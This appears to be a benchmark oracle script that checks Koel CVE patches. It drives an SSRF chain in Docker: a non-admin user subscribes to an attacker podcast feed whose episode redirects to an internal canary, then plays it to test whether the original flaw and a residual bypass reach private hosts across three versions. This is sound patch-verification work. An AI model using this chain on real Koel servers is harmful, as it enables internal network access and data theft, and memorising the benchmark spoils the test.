#!/usr/bin/env python3
"""PatchClosure-Bench gate oracle for koel-cve-2026-54491.

Drives REAL Koel (official phanan/koel image, per version) over EXTERNAL HTTP as an
authenticated NON-admin user and measures the two benign SSRF vectors against the
internal canary sidecar (10.99.0.192, no host port).

Trigger (identical every version): the listener subscribes to the attacker's podcast
feed (POST /api/podcasts) and plays its episode (GET /play/{episode}?api_token=...).
A single /play makes Koel's PodcastStreamerAdapter run BOTH server-side fetch legs of
the episode->path (http://11.0.0.10/redir, which 302s to the private canary):

  * ORIGINAL (CVE-2026-47260): EpisodePlayable Http::sink()->get() download (full-read).
      Detection = ${PCB_FLAG} bytes appear in the /play HTTP response body.
  * RESIDUAL (CVE-2026-54491): getStreamableUrl() OPTIONS/HEAD probe (blind sibling).
      Detection = the canary sidecar received an inbound request.

Gate booleans:
  original_reaches_flag_on_v0  = flag in /play body @ v0 (9.3.2, no guard)
  original_blocked_on_v1       = flag NOT in /play body @ v1 (9.3.5 isSafeUrl+on_redirect)
  residual_reaches_flag_on_v1  = canary hit @ v1 (getStreamableUrl has no on_redirect)
  residual_blocked_on_v2       = canary NOT hit @ v2 (9.7.1 pinned per-hop validation)
"""
import json
import os
import subprocess
import sys
import time
import urllib.request

HERE = __file__.rsplit("/", 1)[0] or "."
PROJECT = "koel-cve-2026-54491"
FEED = "http://11.0.0.10/feed.xml"
EMAIL, PW = "listener@pcb.test", "ListenerPass123"

VERSIONS = [
    ("v0", "koel-v0", 39820),
    ("v1", "koel-v1", 39821),
    ("v2", "koel-v2", 39822),
]


def flag():
    f = os.environ.get("PCB_FLAG")
    if f:
        return f.strip()
    with open(f"{HERE}/.pcb_flag") as fh:
        return fh.read().strip()


def sh(*args, check=True, capture=True):
    return subprocess.run(
        args, cwd=HERE, check=check,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.STDOUT if capture else None,
        text=True,
    )


def compose(*args, **kw):
    return sh("docker", "compose", *args, **kw)


def http(method, url, data=None, headers=None, timeout=90):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:  # noqa
        return -1, str(e).encode()


def wait_healthy(container, tries=15):
    for _ in range(tries):
        r = sh("docker", "inspect", "--format", "{{.State.Health.Status}}",
               f"{PROJECT}-{container}-1", check=False)
        if r.stdout.strip() == "healthy":
            return True
        time.sleep(12)
    return False


def canary_reset():
    compose("exec", "-T", "canary", "sh", "-c", ": > /hits.log")


def canary_hits():
    return compose("exec", "-T", "canary", "sh", "-c", "cat /hits.log").stdout.strip()


def setup(service):
    sh("docker", "cp", f"{HERE}/setup.sh", f"{PROJECT}-{service}-1:/setup.sh")
    compose("exec", "-T", service, "sh", "/setup.sh")


def trigger(port):
    """Login (non-admin) -> subscribe attacker feed -> play episode. Returns the /play
    body and the canary hit-log captured across the play."""
    base = f"http://localhost:{port}"
    st, body = http("POST", f"{base}/api/me",
                    data=json.dumps({"email": EMAIL, "password": PW}).encode(),
                    headers={"Content-Type": "application/json", "Accept": "application/json"})
    tok = json.loads(body)
    api, audio = tok["token"], tok["audio-token"]

    st, body = http("POST", f"{base}/api/podcasts",
                    data=json.dumps({"url": FEED}).encode(),
                    headers={"Authorization": f"Bearer {api}",
                             "Content-Type": "application/json", "Accept": "application/json"})
    try:
        pid = json.loads(body)["id"]
    except (KeyError, ValueError):
        # Already subscribed (409) on a re-run: find the existing podcast by feed URL.
        st, body = http("GET", f"{base}/api/podcasts",
                        headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
        items = json.loads(body)
        items = items.get("data", items) if isinstance(items, dict) else items
        pid = next(p["id"] for p in items if p.get("url") == FEED)

    st, body = http("GET", f"{base}/api/podcasts/{pid}/episodes",
                    headers={"Authorization": f"Bearer {api}", "Accept": "application/json"})
    episode = json.loads(body)[0]["id"]

    canary_reset()
    st, play_body = http("GET", f"{base}/play/{episode}?api_token={audio}")
    hits = canary_hits()
    return {"episode": episode, "play_status": st,
            "play_body": play_body.decode("utf-8", "replace"), "canary": hits}


def main():
    fl = flag()
    results = {}
    for prof, service, port in VERSIONS:
        print(f"\n=== {prof} ({service}, :{port}) ===", flush=True)
        compose("--profile", prof, "up", "-d", service, capture=False)
        assert wait_healthy(service), f"{service} never became healthy"
        setup(service)
        r = trigger(port)
        r["flag_in_body"] = fl in r["play_body"]
        r["canary_hit"] = bool(r["canary"])
        results[prof] = r
        print(f"  play_status={r['play_status']} flag_in_body={r['flag_in_body']} "
              f"canary_hit={r['canary_hit']} canary={r['canary']!r}", flush=True)

    gate = {
        "original_poc_reaches_flag_on_v0": results["v0"]["flag_in_body"],
        "original_poc_blocked_on_v1": not results["v1"]["flag_in_body"],
        "bypass_poc_reaches_flag_on_v1": results["v1"]["canary_hit"],
        "residual_blocked_on_v2": not results["v2"]["canary_hit"],
    }
    verdict = all(gate.values())
    print("\n=== GATE ===")
    print(json.dumps(gate, indent=2))
    print("VERDICT:", "PASS" if verdict else "FAIL")
    return 0 if verdict else 1


if __name__ == "__main__":
    sys.exit(main())
